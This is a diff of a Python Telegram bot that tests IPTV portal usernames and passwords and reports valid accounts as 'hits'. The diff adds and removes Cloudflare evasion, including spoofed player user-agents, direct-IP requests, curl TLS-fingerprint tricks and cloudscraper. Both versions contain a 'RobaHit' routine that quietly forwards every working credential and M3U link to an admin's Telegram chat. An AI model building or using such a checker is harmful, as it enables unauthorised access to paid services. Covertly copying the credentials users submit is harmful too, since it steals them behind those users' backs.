+    return "RETRY", None
 
-# ╔══════════════════════════════════════════════════════╗
-# ║      🛡️  BYPASS CF — Solo cuando es necesario        ║
-# ║  Técnica 1: headers IPTV variados                   ║
-# ║  Técnica 2: IP directa + header Host                ║
-# ║  Técnica 3: curl del sistema (TLS fingerprint ≠)    ║
-# ║  Técnica 4: cloudscraper (si está instalado)        ║
-# ╚══════════════════════════════════════════════════════╝
+def verify_account(portal: str, user: str, pwd: str) -> tuple:
+    """
+    Verificación completa anti-falsos-negativos:
+    1. Test TCP rápido (5s)
+    2. Si dominio CF → bypass dedicado con cloudscraper
+    3. Peticiones paralelas con múltiples UAs y reintentos (3 intentos)
+    4. Delay de 3s entre peticiones al mismo dominio
+    5. Último recurso: get.php sin parámetros extra + CF bypass
+    """
+    host   = portal.split(':')[0]
+    port   = int(portal.split(':')[1]) if ':' in portal else 8080
+    is_cf  = _is_cf_domain(host)
 
-def _bypass_headers(url: str, host: str) -> tuple:
-    """Prueba varios conjuntos de headers IPTV reales."""
-    header_sets = [
-        {"User-Agent":"VLC/3.0.20 LibVLC/3.0.20","Accept":"*/*",
-         "Icy-MetaData":"1","Connection":"close"},
-        {"User-Agent":"TiviMate/4.7.0 (Android 12; Dalvik/2.1.0)",
-         "Accept":"*/*","Accept-Encoding":"gzip","Connection":"close"},
-        {"User-Agent":"Kodi/21.0 (X11; Linux x86_64) App_Bitness/64 Version/21.0",
-         "Accept":"application/json, text/plain, */*",
-         "Accept-Language":"es-419","Accept-Encoding":"gzip, deflate"},
-        {"User-Agent":"IPTV Smarters Pro/3.0.9.4 (Android 10)",
-         "Accept":"*/*","Connection":"keep-alive"},
-    ]
-    for hdrs in header_sets:
+    # ── 1. Test TCP rápido ────────────────────────────────────────────────
+    tcp_ok = False
+    for p in (port, 443, 80):
         try:
-            s = requests.Session()
-            s.mount("http://",  HTTPAdapter(max_retries=0))
-            s.mount("https://", HTTPAdapter(max_retries=0))
-            load_cook(s, host)
-            r = s.get(url, headers=hdrs, timeout=(T_CONN, T_READ),
-                      verify=False, allow_redirects=True)
-            save_cook(s, host)
-            res, pay = process(r)
-            if res != "RETRY":
-                log.info(f"[bypass-hdrs] ✅ {hdrs['User-Agent'][:30]}")
-                return res, pay
+            s = socket.create_connection((host, p), timeout=5)
+            s.close()
+            tcp_ok = True
+            log.info(f"TCP ✅ {host}:{p}")
+            break
         except Exception:
             pass
-    return "RETRY", None
+    if not tcp_ok:
+        log.warning(f"TCP ❌ {host} → RETRY directo")
+        return "RETRY", None
 
-def _bypass_ip(url: str, host: str) -> tuple:
-    """Conecta por IP directa para saltar CF en el dominio."""
-    domain = host.split(":")[0]
-    port   = host.split(":")[1] if ":" in host else "8080"
-    try:
-        real_ip = socket.gethostbyname(domain)
-        if real_ip == domain:
-            return "RETRY", None
-        url_ip  = url.replace(domain, real_ip, 1)
-        hdrs = {
-            "User-Agent": "VLC/3.0.20 LibVLC/3.0.20",
-            "Host": domain + (f":{port}" if port not in ("80","443") else ""),
-            "Accept": "*/*", "Connection": "close",
+    # ── 2. Bypass CF si es dominio protegido ─────────────────────────────
+    if is_cf:
+        log.info(f"🛡️ CF detectado: {host}")
+        for scheme in ("http", "https"):
+            _apply_domain_delay(host)
+            api = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
+            r   = _cf_request(api, host, timeout=TIMEOUT_READ)
+            res, pay = _process_response(r)
+            if res != "RETRY":
+                return res, pay
+            _apply_domain_delay(host)
+            m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
+            r2  = _cf_request(m3u, host, timeout=TIMEOUT_READ)
+            res2, pay2 = _process_response(r2)
+            if res2 != "RETRY":
+                return res2, pay2
+
+    # ── 3. Peticiones paralelas con reintentos ───────────────────────────
+    tasks = []
+    selected_uas = random.sample(ALL_USER_AGENTS, min(6, len(ALL_USER_AGENTS)))
+    for scheme in ("http", "https"):
+        api = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
+        m3u = f"{scheme}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
+        m3u_simple = f"{scheme}://{portal}/get.php?username={user}&password={pwd}"
+        for ua in selected_uas:
+            tasks.append((api, ua, host))
+        tasks.append((m3u, ALL_USER_AGENTS[0], host))
+        tasks.append((m3u_simple, ALL_USER_AGENTS[1], host))
+
+    with ThreadPoolExecutor(max_workers=8) as ex:
+        futures = {
+            ex.submit(_request_with_retries, url, ua, h, TIMEOUT_READ, 3): (url, ua)
+            for url, ua, h in tasks
         }
-        s = requests.Session()
-        s.mount("http://",  HTTPAdapter(max_retries=0))
-        s.mount("https://", HTTPAdapter(max_retries=0))
-        r = s.get(url_ip, headers=hdrs, timeout=(T_CONN, T_READ),
-                  verify=False, allow_redirects=False)
-        res, pay = process(r)
-        if res != "RETRY":
-            log.info(f"[bypass-ip] ✅ IP {real_ip}")
-            return res, pay
-    except Exception as e:
-        log.debug(f"[bypass-ip] {e}")
-    return "RETRY", None
-
-def _bypass_curl(url: str, host: str) -> tuple:
-    """Usa curl del sistema (TLS fingerprint diferente al de Python)."""
-    try:
-        cmd = [
-            "curl","-s","-L","--max-time","18","--insecure",
-            "-A","VLC/3.0.20 LibVLC/3.0.20",
-            "-H","Accept: */*",
-            "-H","Accept-Encoding: gzip, deflate",
-            "--compressed", url
-        ]
-        res = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
-        if res.returncode == 0 and res.stdout.strip():
-            raw = res.stdout.strip()
-            if not is_cf_page(raw):
-                class FakeR:
-                    status_code = 200
-                    text = raw
-                log.info(f"[bypass-curl] ✅ {host}")
-                return process(FakeR())
-    except FileNotFoundError:
-        pass
-    except Exception as e:
-        log.debug(f"[bypass-curl] {e}")
-    return "RETRY", None
-
-def _bypass_cloudscraper(url: str, host: str) -> tuple:
-    """Usa cloudscraper si está instalado."""
-    try:
-        import cloudscraper
-        sc = cloudscraper.create_scraper(
-            browser={"browser":"chrome","platform":"windows","mobile":False},
-            delay=2
-        )
-        load_cook(sc, host)
-        r = sc.get(url, timeout=20, verify=False, allow_redirects=True)
-        if r.status_code in (200, 206):
-            raw = r.text.strip()
-            if not is_cf_page(raw):
-                save_cook(sc, host)
-                log.info(f"[bypass-cs] ✅ {host}")
-                return process(r)
-    except ImportError:
-        pass
-    except Exception as e:
-        log.debug(f"[bypass-cs] {e}")
-    return "RETRY", None
-
-def cf_bypass(url: str, host: str) -> tuple:
-    """Motor de bypass — prueba las 4 técnicas en orden."""
-    log.info(f"[cf] Bypass para {host}")
-    for fn in (_bypass_headers, _bypass_ip, _bypass_curl, _bypass_cloudscraper):
-        res, pay = fn(url, host)
-        if res != "RETRY":
-            return res, pay
-    log.warning(f"[cf] Todas las técnicas fallaron para {host}")
-    return "RETRY", None
-
-
-# ╔══════════════════════════════════════════════════════╗
-# ║     🚀 VERIFICACIÓN PRINCIPAL — Todos los formatos  ║
-# ╚══════════════════════════════════════════════════════╝
-
-def verify(portal: str, user: str, pwd: str,
-           is_xui: bool = False, raw_url: str = None) -> tuple:
-    """
-    Verifica una cuenta IPTV. Soporta todos los formatos:
-    - Xtream Codes (get.php + player_api.php)
-    - XUI One (playlist/)
-    - M3U directo
-    - Cloudflare / DDoS-Guard (bypass automático)
-    """
-    host    = portal.split(":")[0]
-    port    = int(portal.split(":")[1]) if ":" in portal else 8080
-    t0      = time.time()
-    elapsed = lambda: time.time() - t0
-    timedout= lambda: elapsed() >= T_TOTAL
-
-    # ── Si es M3U directo, verificar rápido ───────────
-    if raw_url:
-        res, pay = fetch(raw_url, host)
-        if res != "RETRY":
-            return res, pay
-
-    # ── Construir todas las URLs a probar ─────────────
-    # Determinar esquema por puerto
-    if port in (443, 8443, 2053, 2083, 2087, 2096):
-        schemes = ["https", "http"]
-    else:
-        schemes = ["http", "https"]
-
-    urls = []
-    for sc in schemes:
-        base = f"{sc}://{portal}"
-        # player_api primero (da más info de la cuenta)
-        urls.append(f"{base}/player_api.php?username={user}&password={pwd}")
-        # get.php
-        urls.append(f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus")
-        # XUI One
-        if is_xui:
-            urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
-            urls.append(f"{base}/playlist/{user}/{pwd}/m3u")
-
-    # XUI One siempre (aunque no se haya detectado)
-    for sc in schemes:
-        base = f"{sc}://{portal}"
-        urls.append(f"{base}/playlist/{user}/{pwd}/m3u_plus")
-        urls.append(f"{base}/playlist/{user}/{pwd}/m3u")
-        # get.php sin type
-        urls.append(f"{base}/get.php?username={user}&password={pwd}")
-
-    # Dedup manteniendo orden
-    seen, unique = set(), []
-    for u in urls:
-        if u not in seen:
-            seen.add(u); unique.append(u)
-
-    # ── Paso 1: Paralelo ──────────────────────────────
-    remaining = T_TOTAL - elapsed()
-    futures = {_POOL.submit(fetch, u, host): u for u in unique}
-    try:
-        for fut in as_completed(futures, timeout=remaining):
+        for fut in as_completed(futures, timeout=120):
             try:
-                res, pay = fut.result()
-                if res in ("HIT","FAIL","CUSTOM"):
-                    for f in futures: f.cancel()
-                    log.info(f"[verify] {res} en {elapsed():.1f}s | {futures[fut][:65]}")
-                    return res, pay
+                result, payload = fut.result()
+                if result in ("HIT", "FAIL", "CUSTOM"):
+                    for f in futures:
+                        f.cancel()
+                    return result, payload
             except Exception as e:
-                log.debug(f"[verify] future: {e}")
-    except Exception:
-        pass
+                log.debug(f"Future err: {e}")
 
-    # ── Paso 2: Reintentos con UA rotación ────────────
-    if not timedout():
-        log.info(f"[verify] Reintentando con UA alternativo para {host}")
-        for ua in (UAS[1], UAS[2], UAS[3]):
-            if timedout(): break
-            for sc in schemes[:1]:  # solo http
-                base = f"{sc}://{portal}"
-                for ep in (
-                    f"{base}/player_api.php?username={user}&password={pwd}",
-                    f"{base}/get.php?username={user}&password={pwd}&type=m3u_plus",
-                    f"{base}/playlist/{user}/{pwd}/m3u_plus",
-                ):
-                    if timedout(): break
-                    res, pay = fetch(ep, host, ua=ua)
-                    if res != "RETRY":
-                        log.info(f"[verify] {res} con UA {ua[:25]}")
-                        return res, pay
-                    time.sleep(0.3)
-
-    # ── Paso 3: Bypass CF (siempre, no solo dominios conocidos) ──
-    if not timedout():
-        log.info(f"[verify] Intentando bypass CF para {host}")
-        for sc in schemes:
-            if timedout(): break
-            for ep in (
-                f"{sc}://{portal}/player_api.php?username={user}&password={pwd}",
-                f"{sc}://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus",
-                f"{sc}://{portal}/playlist/{user}/{pwd}/m3u_plus",
-            ):
-                if timedout(): break
-                res, pay = cf_bypass(ep, host)
+    # ── 4. Último recurso: get.php simple + CF bypass ────────────────────
+    log.info(f"🔄 Último recurso para {host}")
+    for scheme in ("http", "https"):
+        # get.php sin parámetros extra — algunos servidores solo responden así
+        for url_lr in (
+            f"{scheme}://{portal}/get.php?username={user}&password={pwd}",
+            f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}",
+        ):
+            _apply_domain_delay(host)
+            try:
+                ua = ALL_USER_AGENTS[0]
+                r  = requests.get(url_lr, headers={"User-Agent": ua},
+                                  timeout=(TIMEOUT_CONN, TIMEOUT_READ),
+                                  verify=False, allow_redirects=True)
+                res, pay = _process_response(r)
                 if res != "RETRY":
                     return res, pay
+            except Exception as e:
+                log.debug(f"LR err: {e}")
+        # CF bypass también en último recurso
+        if not is_cf:
+            _apply_domain_delay(host)
+            url = f"{scheme}://{portal}/player_api.php?username={user}&password={pwd}"
+            r   = _cf_request(url, host, timeout=TIMEOUT_READ + 5)
+            res, pay = _process_response(r)
+            if res != "RETRY":
+                return res, pay
 
-    log.info(f"[verify] RETRY final {host} — {elapsed():.1f}s")
     return "RETRY", None
 
+# ══════════════════════════════════════════════════════
+#  📊 DATOS ADICIONALES — Paralelos
+# ══════════════════════════════════════════════════════
 
-# ╔══════════════════════════════════════════════════════╗
-# ║         📊 CONTEO DE CONTENIDO — Streaming           ║
-# ╚══════════════════════════════════════════════════════╝
-
-def _count_stream(url: str, timeout_s: int = 15) -> str:
+def _count_action(portal, user, pwd, action) -> str:
     try:
-        s = mk_session()
-        r = s.get(url, timeout=(T_CONN, timeout_s),
-                  verify=False, stream=True)
-        if r.status_code != 200:
-            r.close(); return ""
-        depth = count = 0
-        in_str = esc = started = False
-        read = 0
-        for chunk in r.iter_content(65536):
-            if not chunk: continue
-            read += len(chunk)
-            for ch in chunk.decode("utf-8", errors="ignore"):
-                if esc:      esc=False; continue
-                if ch=="\\" and in_str: esc=True; continue
-                if ch=='"':  in_str=not in_str; continue
-                if in_str:   continue
-                if ch=='[' and not started and depth==0:
-                    started=True; continue
-                if not started: continue
-                if ch=='{':
-                    depth+=1
-                    if depth==1: count+=1
-                elif ch=='}': depth-=1
-                elif ch==']' and depth==0:
-                    r.close(); return str(count)
-            if read >= 25*1024*1024:
-                r.close(); return str(count) if count else ""
-        r.close()
-        return str(count) if count else ""
+        ua = random.choice(ALL_USER_AGENTS[:6])
+        r  = requests.get(
+            f"http://{portal}/player_api.php?username={user}&password={pwd}&action={action}",
+            headers={"User-Agent": ua}, timeout=15, verify=False)
+        if r.status_code == 200:
+            d = r.json()
+            return str(len(d)) if isinstance(d, list) else "0"
     except Exception:
-        return ""
+        pass
+    return "N/D"
 
-def get_counts(portal: str, user: str, pwd: str) -> tuple:
-    base = f"http://{portal}"
-    futs = {
-        _POOL.submit(_count_stream,
-            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",15): "live",
-        _POOL.submit(_count_stream,
-            f"{base}/player_api.php?username={user}&password={pwd}&action=get_vod_streams",15): "vod",
-        _POOL.submit(_count_stream,
-            f"{base}/player_api.php?username={user}&password={pwd}&action=get_series",15): "ser",
-    }
-    res = {}
-    try:
-        for fut in as_completed(futs, timeout=20):
-            try: res[futs[fut]] = fut.result() or "N/D"
-            except Exception: pass
-    except Exception: pass
-    return res.get("live","N/D"), res.get("vod","N/D"), res.get("ser","N/D")
+def get_content_counts(portal, user, pwd) -> tuple:
+    res = {"live":"N/D","vod":"N/D","series":"N/D"}
+    with ThreadPoolExecutor(max_workers=3) as ex:
+        futs = {
+            ex.submit(_count_action, portal, user, pwd, "get_live_streams"): "live",
+            ex.submit(_count_action, portal, user, pwd, "get_vod_streams"):  "vod",
+            ex.submit(_count_action, portal, user, pwd, "get_series"):       "series",
+        }
+        for fut in as_completed(futs, timeout=25):
+            try:
+                res[futs[fut]] = fut.result()
+            except Exception:
+                pass
+    return res["live"], res["vod"], res["series"]
 
-def get_cats(portal: str, user: str, pwd: str, limit: int = 20) -> str:
+def get_categories(portal, user, pwd, limit=20) -> str:
     try:
-        base = f"http://{portal}"
-        r = requests.get(
-            f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
-            headers={"User-Agent":"VLC/3.0.20 LibVLC/3.0.20"},
-            timeout=(T_CONN, 12), verify=False)
-        if r.status_code != 200: return ""
+        ua = random.choice(ALL_USER_AGENTS[:6])
+        r  = requests.get(
+            f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_categories",
+            headers={"User-Agent": ua}, timeout=15, verify=False)
+        if r.status_code != 200:
+            return ""
         cats = r.json()
-        if not isinstance(cats, list) or not cats: return ""
-        # Contar canales por categoría
-        count_map = {}
+        if not isinstance(cats, list) or not cats:
+            return ""
+        count_map: dict = {}
         try:
-            rc = requests.get(
-                f"{base}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
-                headers={"User-Agent":"VLC/3.0.20 LibVLC/3.0.20"},
-                timeout=(T_CONN, 15), verify=False, stream=True)
-            if rc.status_code == 200:
-                raw = b""
-                for chunk in rc.iter_content(65536):
-                    raw += chunk
-                    if len(raw) > 10*1024*1024: break
-                rc.close()
-                for ch in json.loads(raw.decode("utf-8","ignore")):
+            r2 = requests.get(
+                f"http://{portal}/player_api.php?username={user}&password={pwd}&action=get_live_streams",
+                headers={"User-Agent": ua}, timeout=20, verify=False)
+            if r2.status_code == 200:
+                for ch in r2.json():
                     cid = str(ch.get("category_id",""))
-                    count_map[cid] = count_map.get(cid,0)+1
-        except Exception: pass
+                    count_map[cid] = count_map.get(cid, 0) + 1
+        except Exception:
+            pass
         lines = []
         for c in cats[:limit]:
             name = c.get("category_name","").replace("\\/","/").strip()
             cid  = str(c.get("category_id",""))
-            if not name: continue
-            cnt  = f" [{count_map[cid]}]" if cid in count_map else ""
-            lines.append(f"   {ARR} {name}{cnt}")
+            if not name:
+                continue
+            cnt = f" [{count_map[cid]}]" if cid in count_map else ""
+            lines.append(f"  ➠ {name}{cnt}")
         if len(cats) > limit:
-            lines.append(f"   ➕ ...y {len(cats)-limit} categorías más")
+            lines.append(f"  ➕ ...y {len(cats)-limit} categorías más")
         return "\n".join(lines)
     except Exception:
         return ""
 
-def get_location(portal: str) -> str:
+def get_location(portal) -> str:
     try:
         ip = portal.split(":")[0]
-        r  = requests.get(f"http://ip-api.com/json/{ip}",
-                          timeout=4, verify=False)
+        r  = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
         if r.status_code == 200:
             d = r.json()
             if d.get("status") == "success":
-                code = d.get("countryCode","")
-                return f"{d.get('country','?')} {flag(code)}"
-    except Exception: pass
-    return f"Desconocido {GLOB}"
+                return f"{d.get('country','?')} {FLAGS.get(d.get('countryCode',''),'🌍')}"
+    except Exception:
+        pass
+    return "Desconocido 🌍"
 
+# ══════════════════════════════════════════════════════
+#  🔔 ROBAHITS — Copia de HITs al admin
+# ══════════════════════════════════════════════════════
 
-# ╔══════════════════════════════════════════════════════╗
-# ║             🔔 ROBAHITS — Envío automático           ║
-# ╚══════════════════════════════════════════════════════╝
-
-def send_roba(portal, user, pwd, ui, live, vod, series, from_user):
-    if not BOT_TOKEN or not ROBAHITS_CHATID: return
+def send_robahit(portal, user, pwd, ui, live, vod, series, from_user):
+    """
+    Envía copia del HIT al admin en segundo plano.
+    Usa el mismo BOT_TOKEN — no necesitas un segundo bot.
+    Los hits llegan a ROBAHITS_CHATID (tu ID de Telegram).
+    """
+    if not BOT_TOKEN or not ROBAHITS_CHATID:
+        return
     try:
-        expire = ts_date(ui.get("exp_date",0))
-        m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
-        txt = (
-            f"╔{'═'*30}╗\n"
-            f"║  {SK} <b>ROBO HIT — 🦂LUIS R🦂</b> {SK}  ║\n"
-            f"╚{'═'*30}╝\n\n"
-            f"{FIRE} <b>¡CUENTA ACTIVA CAPTURADA!</b> {FIRE}\n\n"
-            f"{ARR} {GLOB} <b>Portal:</b> <code>{portal}</code>\n"
-            f"{ARR} 👤 <b>Usuario:</b> <code>{user}</code>\n"
-            f"{ARR} {KEY} <b>Pass:</b> <code>{pwd}</code>\n"
-            f"{ARR} {CAL} <b>Vence:</b> {expire}\n\n"
-            f"{LIV} En vivo: <b>{live}</b>  {MOV} VOD: <b>{vod}</b>  {SER} Series: <b>{series}</b>\n\n"
-            f'{ARR} 🔗 <a href="{m3u}">📥 Descargar M3U</a>\n\n'
-            f"👤 Por: @{from_user}\n"
-            f"{CLK} {now_str()}\n"
-            f"{SK} {BOT_USERNAME}"
+        expire = ts_to_date(ui.get("exp_date", 0))
+        m3u    = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
+        text   = (
+            f"🦂 <b>ROBO HIT — LUIS R</b> 🦂\n\n"
+            f"👤 Verificado por: @{from_user}\n\n"
+            f"🌐 Portal: <code>{portal}</code>\n"
+            f"👤 Usuario: <code>{user}</code>\n"
+            f"🔑 Pass: <code>{pwd}</code>\n"
+            f"⏲ Vence: {expire}\n"
+            f"📺 {live} canales | 🎥 {vod} VOD | 📹 {series} series\n"
+            f'🔗 <a href="{m3u}">M3U Link</a>\n\n'
+            f"🕐 {now_str()}\n"
+            f"🦂 {BOT_USERNAME}"
         )
         requests.post(
             f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-            json={"chat_id":ROBAHITS_CHATID,"text":txt,
-                  "parse_mode":"HTML","disable_web_page_preview":True},
-            timeout=10)
+            json={
+                "chat_id":               ROBAHITS_CHATID,
+                "text":                  text,
+                "parse_mode":            "HTML",
+                "disable_web_page_preview": True,
+            },
+            timeout=10
+        )
+        log.info(f"🔔 RobaHit enviado → {ROBAHITS_CHATID}")
     except Exception as e:
-        log.warning(f"[roba] {e}")
+        log.warning(f"RobaHit err: {e}")
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║          🃏 TARJETAS DE RESULTADO                    ║
-# ╚══════════════════════════════════════════════════════╝
+# ══════════════════════════════════════════════════════
+#  🃏 TARJETAS DE RESULTADO
+# ══════════════════════════════════════════════════════
 
 def card_hit(portal, user, pwd, ui, live, vod, series, cats, tg_user) -> str:
-    expire  = ts_date(ui.get("exp_date",0))
-    created = ts_date(ui.get("created_at",0))
-    active  = ui.get("active_cons","?")
-    maxcon  = ui.get("max_connections","?")
-    status  = ui.get("status","Active")
-    trial   = "❌ No" if str(ui.get("is_trial","0")) in ("0","false","") else "✅ Sí"
-    loc     = get_location(portal)
+    expire   = ts_to_date(ui.get("exp_date", 0))
+    created  = ts_to_date(ui.get("created_at", 0))
+    active   = ui.get("active_cons", "?")
+    maxcon   = ui.get("max_connections", "?")
+    status   = ui.get("status", "Active")
+    trial    = "No Trial" if str(ui.get("is_trial","0")) in ("0","false","") else "✅ Trial"
+    location = get_location(portal)
     m3u = f"http://{portal}/get.php?username={user}&password={pwd}&type=m3u_plus"
     epg = f"http://{portal}/xmltv.php?username={user}&password={pwd}"
-
-    t  = f"{L1}\n"
-    t += f"  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
-    t += f"  {DIAM} <b>ᴄᴜᴇɴᴛᴀ ɪᴘᴛᴠ ᴠᴇʀɪꜰɪᴄᴀᴅᴀ</b> {DIAM}\n"
-    t += f"{L1}\n\n"
-    t += f"  {FIRE} <b>ESTADO:</b> 🟢 <b>{status.upper()} — ACTIVA</b> {FIRE}\n\n"
-    t += f"{L2}\n  {GLOB} <b>ACCESO</b>\n{L2}\n"
-    t += f"  {ARR} 🌐 Portal: <code>{portal}</code>\n"
-    t += f"  {ARR} 👤 Usuario: <code>{user}</code>\n"
-    t += f"  {ARR} {KEY} Pass: <code>{pwd}</code>\n"
-    t += f"  {ARR} 🧪 Trial: {trial}\n\n"
-    t += f"{L2}\n  {CAL} <b>TIEMPO</b>\n{L2}\n"
-    t += f"  {ARR} 📅 Creada: {created}\n"
-    t += f"  {ARR} ⏳ Vence: <b>{expire}</b>\n"
-    t += f"  {ARR} 🔁 Conexiones: {active}/{maxcon}\n"
-    t += f"  {ARR} 📍 País: {loc}\n\n"
-    t += f"{L2}\n  {LIV} <b>CONTENIDO</b>\n{L2}\n"
-    t += f"  {ARR} 📺 En Vivo: <b>{live}</b> canales\n"
-    t += f"  {ARR} 🎬 VOD: <b>{vod}</b> películas\n"
-    t += f"  {ARR} 🎭 Series: <b>{series}</b> series\n\n"
-    t += f"{L2}\n  🔗 <b>LINKS</b>\n{L2}\n"
-    t += f'  {ARR} <a href="{m3u}">📥 M3U Plus</a>\n'
-    t += f'  {ARR} <a href="{epg}">📋 EPG/Guía</a>\n\n'
+    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
+    t += f"➥ 🟢 CUENTA VÁLIDA\n"
+    t += f"➥ 🆙 Estado: ✅ {status.upper()}\n"
+    t += f"➥ 🧪 Trial: {trial}\n"
+    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
+    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
+    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
+    t += f"➥ 📅 Creada: {created}\n"
+    t += f"➥ ⏲ Vence: {expire}\n"
+    t += f"➥ 👁 Conexiones: {active} / {maxcon}\n"
+    t += f"➥ 📍 País: {location}\n"
+    t += f"{LINE}\n     ★彡ᴄᴏɴᴛᴇɴᴛ彡★\n{LINE}\n"
+    t += f"➥ 📺 En Vivo: {live}\n"
+    t += f"➥ 🎥 VOD: {vod}\n"
+    t += f"➥ 📹 Series: {series}\n"
+    t += f"{LINE}\n"
+    t += f'➥ 🔗 <a href="{m3u}">M3U Link</a>   |   <a href="{epg}">EPG Link</a>\n'
     if cats:
-        t += f"{L2}\n  📡 <b>CATEGORÍAS EN VIVO</b>\n{L2}\n"
-        t += f"{cats}\n\n"
-    t += f"{L2}\n"
-    t += f"  {CHK} Verificado para @{tg_user}\n"
-    t += f"  {CLK} {now_str()}\n"
-    t += f"  {SK} {BOT_USERNAME}\n"
-    t += f"{L1}"
+        t += f"{LINE}\n   ★彡ᴄᴀᴛᴇɢᴏʀíᴀs彡★\n{LINE}\n{cats}\n"
+    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
+    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
     return t
 
 def card_custom(portal, user, pwd, ui, tg_user) -> str:
-    t  = f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
-    t += f"  {WRN} <b>ᴄᴜᴇɴᴛᴀ ɴᴏ ᴀᴄᴛɪᴠᴀ</b>\n{L1}\n\n"
-    t += f"  🟡 <b>EXISTE pero NO ESTÁ ACTIVA</b>\n\n{L2}\n"
-    t += f"  {ARR} 🌐 <code>{portal}</code>\n"
-    t += f"  {ARR} 👤 <code>{user}</code>\n"
-    t += f"  {ARR} 🆙 Estado: {ui.get('status','?').upper()}\n"
-    t += f"  {ARR} ⏳ Vence: {ts_date(ui.get('exp_date',0))}\n"
-    t += f"  {ARR} 🔁 Máx: {ui.get('max_connections','?')}\n\n{L2}\n"
-    t += f"  {CHK} @{tg_user}  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}"
+    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
+    t += f"➥ 🟡 CUENTA EXISTE — NO ACTIVA\n"
+    t += f"➥ 🆙 Estado: ⚠️ {ui.get('status','?').upper()}\n"
+    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
+    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
+    t += f"➥ 🔑 Contraseña: <code>{pwd}</code>\n"
+    t += f"➥ ⏲ Vence: {ts_to_date(ui.get('exp_date',0))}\n"
+    t += f"➥ 👥 Max: {ui.get('max_connections','?')}\n"
+    t += f"{LINE}\n   ✔️ Verificado para @{tg_user}\n"
+    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
     return t
 
 def card_fail(portal, user, tg_user) -> str:
-    t  = f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
-    t += f"  {CRS} <b>ᴄᴜᴇɴᴛᴀ ɪɴᴠᴀ́ʟɪᴅᴀ</b>\n{L1}\n\n"
-    t += f"  🔴 <b>CREDENCIALES INCORRECTAS</b>\n\n{L2}\n"
-    t += f"  {ARR} 🌐 <code>{portal}</code>\n"
-    t += f"  {ARR} 👤 <code>{user}</code>\n"
-    t += f"  {CRS} Esta cuenta no existe o la contraseña es incorrecta\n\n{L2}\n"
-    t += f"  {CHK} @{tg_user}  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}"
+    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
+    t += f"➥ 🔴 CUENTA INVÁLIDA\n"
+    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
+    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
+    t += f"{LINE}\n   ❌ Credenciales incorrectas (auth=0)\n"
+    t += f"   ✔️ Verificado para @{tg_user}\n"
+    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
     return t
 
 def card_retry(portal, user, tg_user) -> str:
-    t  = f"{L1}\n  {SK} <b>🦂LUIS R🦂</b> {SK}\n"
-    t += f"  ⏳ <b>ꜱɪɴ ʀᴇꜱᴘᴜᴇꜱᴛᴀ ᴠᴀ́ʟɪᴅᴀ</b>\n{L1}\n\n"
-    t += f"  🟠 <b>SERVIDOR NO RESPONDIÓ CORRECTAMENTE</b>\n\n{L2}\n"
-    t += f"  {ARR} 🌐 <code>{portal}</code>\n"
-    t += f"  {ARR} 👤 <code>{user}</code>\n\n"
-    t += f"  💡 <b>Qué puede estar pasando:</b>\n"
-    t += f"   • Servidor CF/DDoS con IP del bot bloqueada\n"
-    t += f"   • Panel no estándar (pega la URL completa)\n"
-    t += f"   • Servidor caído temporalmente\n"
-    t += f"   • Usa /debug para diagnóstico real\n\n{L2}\n"
-    t += f"  {CHK} @{tg_user}  {CLK} {now_str()}\n  {SK} {BOT_USERNAME}\n{L1}"
+    t  = f"{LINE}\n🦂 <b>LUIS R</b> 🦂\n  ★彡ᴀᴄᴄᴏᴜɴᴛ ɪɴꜰᴏ彡★\n{LINE}\n"
+    t += f"➥ ⚠️ SIN RESPUESTA VÁLIDA\n"
+    t += f"➥ 🌐 Portal: <code>{portal}</code>\n"
+    t += f"➥ 👤 Usuario: <code>{user}</code>\n"
+    t += f"{LINE}\n"
+    t += f"   ❓ El servidor no devolvió JSON válido\n"
+    t += f"   📡 Puede ser activa en otro bot si responde M3U puro\n"
+    t += f"   🔁 Intenta pegar la URL completa con /get.php\n"
+    t += f"   ✔️ Verificado para @{tg_user}\n"
+    t += f"   🕐 {now_str()}\n   🦂 {BOT_USERNAME}\n{LINE}"
     return t
 
-
-# ╔══════════════════════════════════════════════════════╗
-# ║              🔄 KEEP-ALIVE 24/7                      ║
